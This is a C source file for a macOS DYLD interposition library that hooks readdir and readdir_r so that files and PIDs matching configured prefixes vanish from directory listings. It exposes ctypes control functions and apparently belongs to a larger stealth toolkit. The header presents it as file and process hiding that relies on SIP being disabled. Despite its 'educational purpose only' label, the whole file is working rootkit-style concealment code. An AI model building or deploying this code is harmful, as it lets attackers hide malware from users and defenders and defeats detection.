/*
 * interpose.c — macOS DYLD interposition library for file/process hiding.
 *
 * Uses the DYLD_INSERT_LIBRARIES mechanism with __attribute__((section))
 * interpose tuples to replace libc functions:
 *   - readdir / readdir_r  → filter directory entries matching hidden prefixes
 *
 * Also exports control functions callable from Python via ctypes.CDLL:
 *   - interpose_hide_prefix(const char *prefix)
 *   - interpose_hide_pid(int pid)
 *   - interpose_is_active(void) → int
 *
 * Build:
 *   clang -dynamiclib -o interpose.dylib interpose.c
 *
 * Usage:
 *   DYLD_INSERT_LIBRARIES=./interpose.dylib ./target_binary
 *
 * Note: Requires System Integrity Protection (SIP) disabled on macOS
 *       for DYLD injection to work. On SIP-enabled systems, this library
 *       is skipped and user-space stealth modules handle concealment.
 *
 * EDUCATIONAL PURPOSE ONLY.
 */

#include <dirent.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>

/* ── Configuration constants ────────────────────────────────────── */

#define MAX_HIDDEN_PREFIXES   32
#define MAX_PREFIX_LEN        256
#define MAX_HIDDEN_PIDS       32

/* ── Hidden-item storage ────────────────────────────────────────── */

static char hidden_prefixes[MAX_HIDDEN_PREFIXES][MAX_PREFIX_LEN];
static int  hidden_prefix_count = 0;

static int  hidden_pids[MAX_HIDDEN_PIDS];
static int  hidden_pid_count = 0;

static int  interpose_active = 1;

static pthread_mutex_t hide_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ── Helpers ────────────────────────────────────────────────────── */

static int is_name_hidden(const char *name)
{
    int i;
    pthread_mutex_lock(&hide_mutex);
    for (i = 0; i < hidden_prefix_count; i++) {
        if (strncmp(name, hidden_prefixes[i],
                    strlen(hidden_prefixes[i])) == 0) {
            pthread_mutex_unlock(&hide_mutex);
            return 1;
        }
    }
    pthread_mutex_unlock(&hide_mutex);
    return 0;
}

static int is_pid_hidden_str(const char *name)
{
    /* Check if name is a numeric PID that we should hide */
    char *endp;
    long pid_val = strtol(name, &endp, 10);
    if (*endp != '\0')
        return 0;  /* not a number */

    int i;
    pthread_mutex_lock(&hide_mutex);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == (int)pid_val) {
            pthread_mutex_unlock(&hide_mutex);
            return 1;
        }
    }
    pthread_mutex_unlock(&hide_mutex);
    return 0;
}

static int should_hide(const char *name)
{
    if (!__atomic_load_n(&interpose_active, __ATOMIC_SEQ_CST))
        return 0;
    if (is_name_hidden(name))
        return 1;
    if (is_pid_hidden_str(name))
        return 1;
    return 0;
}

/* ── Original function pointers (resolved at load time) ────────── */

typedef struct dirent *(*readdir_fn)(DIR *);
typedef int (*readdir_r_fn)(DIR *, struct dirent *, struct dirent **);

static readdir_fn   orig_readdir   = NULL;
static readdir_r_fn orig_readdir_r = NULL;

static pthread_once_t originals_once = PTHREAD_ONCE_INIT;

static void init_originals(void)
{
    orig_readdir   = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
    orig_readdir_r = (readdir_r_fn)dlsym(RTLD_NEXT, "readdir_r");
}

static void resolve_originals(void)
{
    pthread_once(&originals_once, init_originals);
}

/* ── Cleanup on library unload ───────────────────────────────────── */

__attribute__((destructor))
static void cleanup_originals(void)
{
    orig_readdir   = NULL;
    orig_readdir_r = NULL;
}

/* ── Replacement functions (named differently from libc originals) ── */

/*
 * IMPORTANT: Replacement functions MUST have different names from the
 * libc originals (readdir / readdir_r).  If they share the same name,
 * the DYLD interpose tuple resolves both `replacement` and `replacee`
 * to the same local symbol, making the interposition a no-op
 * ("replace readdir with readdir" → nothing happens).
 */

struct dirent *my_readdir(DIR *dirp)
{
    resolve_originals();
    if (!orig_readdir)
        return NULL;

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!should_hide(entry->d_name))
            return entry;
        /* Skip hidden entries — continue to next */
    }
    return NULL;  /* end of directory */
}

/* ── Replacement readdir_r (thread-safe variant) ─────────────────── */

int my_readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result)
{
    resolve_originals();
    if (!orig_readdir_r) {
        *result = NULL;
        return 0;
    }

    int ret;
    while ((ret = orig_readdir_r(dirp, entry, result)) == 0
           && *result != NULL) {
        if (!should_hide(entry->d_name))
            return 0;
        /* Skip hidden entry, read next */
    }
    return ret;
}

/* ── DYLD interpose tuples ──────────────────────────────────────── */
/*
 * These tell the dynamic linker to replace the original libc functions
 * with our filtering versions in all loaded images.
 *
 * Tuple format: { replacement_function, original_function_to_replace }
 *
 * The `replacee` slot must resolve to the *libc* symbol, so we use
 * dlsym(RTLD_DEFAULT, ...) at load time via a constructor, but for
 * the compile-time interpose section, we reference the libc symbol
 * via an extern declaration.
 */

typedef struct {
    const void *replacement;
    const void *replacee;
} interpose_tuple;

/* Declare the libc symbols we want to replace (resolved by DYLD) */
extern struct dirent *readdir(DIR *);
extern int readdir_r(DIR *, struct dirent *, struct dirent **);

__attribute__((used, section("__DATA,__interpose")))
static const interpose_tuple interpose_readdir = {
    (const void *)my_readdir,    /* our filtering replacement */
    (const void *)readdir        /* the libc function to replace */
};

/*
 * readdir_r is deprecated on macOS but still used by some applications
 * (e.g. older C libraries, JVM internals).  We interpose it so that
 * directory enumeration through either API hides the same entries.
 */
__attribute__((used, section("__DATA,__interpose")))
static const interpose_tuple interpose_readdir_r = {
    (const void *)my_readdir_r,  /* our filtering replacement */
    (const void *)readdir_r      /* the libc function to replace */
};

/* ── Exported control API (called from Python ctypes) ───────────── */

__attribute__((visibility("default")))
void interpose_hide_prefix(const char *prefix)
{
    if (!prefix || strlen(prefix) == 0)
        return;

    pthread_mutex_lock(&hide_mutex);
    if (hidden_prefix_count < MAX_HIDDEN_PREFIXES) {
        strncpy(hidden_prefixes[hidden_prefix_count],
                prefix, MAX_PREFIX_LEN - 1);
        hidden_prefixes[hidden_prefix_count][MAX_PREFIX_LEN - 1] = '\0';
        hidden_prefix_count++;
    }
    pthread_mutex_unlock(&hide_mutex);
}

__attribute__((visibility("default")))
void interpose_hide_pid(int pid)
{
    pthread_mutex_lock(&hide_mutex);
    if (hidden_pid_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_pid_count++] = pid;
    }
    pthread_mutex_unlock(&hide_mutex);
}

__attribute__((visibility("default")))
void interpose_unhide_pid(int pid)
{
    int i;
    pthread_mutex_lock(&hide_mutex);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_pid_count];
            break;
        }
    }
    pthread_mutex_unlock(&hide_mutex);
}

__attribute__((visibility("default")))
void interpose_set_active(int active)
{
    __atomic_store_n(&interpose_active, active, __ATOMIC_SEQ_CST);
}

__attribute__((visibility("default")))
int interpose_is_active(void)
{
    return __atomic_load_n(&interpose_active, __ATOMIC_SEQ_CST);
}

__attribute__((visibility("default")))
int interpose_hidden_count(void)
{
    return __atomic_load_n(&hidden_prefix_count, __ATOMIC_ACQUIRE)
         + __atomic_load_n(&hidden_pid_count, __ATOMIC_ACQUIRE);
}
